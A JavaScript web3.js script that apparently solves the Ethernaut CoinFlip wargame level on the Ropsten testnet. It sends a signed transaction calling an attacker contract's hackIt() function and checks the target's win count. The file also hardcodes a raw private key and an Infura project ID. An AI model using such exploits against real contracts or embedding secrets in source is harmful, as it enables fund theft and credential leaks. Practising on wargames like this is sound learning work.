import Web3 from 'web3';
import fs from 'fs';
import path from 'path';
import { debugEthernaut, debugError } from './config/debug';

const infuraProvider = 'https://ropsten.infura.io/v3/ba374d41ee3f4c65ab05c31c4dd452f6';
const web3 = new Web3(infuraProvider);
const privateKey = '0x1D5906FCC19C3641DF21665D42138610A8BC33D6735BB5D06C387AE08B9CC081';
const account = web3.eth.accounts.privateKeyToAccount(privateKey);

const flipCoinSolArtifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/CoinFlipSol.json')));
const flipCoinArtifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/CoinFlip.json')));
const flipCoinAddress = '0x8a90c284dcf34f61f79279a3f442fd9b9c2a875e';
const flipCoinSolAddress = flipCoinSolArtifact.networks['3'].address;
debugEthernaut('flipCoinSolAddress', flipCoinSolAddress);
const flipCoinSol = new web3.eth.Contract(flipCoinSolArtifact.abi, flipCoinSolAddress);
const flipCoin = new web3.eth.Contract(flipCoinArtifact.abi, flipCoinAddress);

const ethernaut = async () => {
  try {
    const estimatedGas = await flipCoinSol.methods.hackIt().estimateGas();
    debugEthernaut('estimated gas', estimatedGas);
    const transactionData = await flipCoinSol.methods.hackIt().encodeABI();
    debugEthernaut('data', transactionData);
    const transaction = {
      from: account.address,
      to: flipCoinSolAddress,
      data: transactionData,
      gasLimit: estimatedGas * 100,
      // gasPrice: utils.toWei(20, 'Gwei'),
    };

    // Sign transaction
    const signedTx = await account.signTransaction(transaction);
    debugEthernaut('signedTx:\n', signedTx);
    const txResult = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    debugEthernaut('txResult:\n', txResult);
    const consecutiveWins = await flipCoin.methods.consecutiveWins().call();
    debugEthernaut('consecutiveWins', consecutiveWins);
  } catch (error) {
    debugError(error);
  }
};

ethernaut();
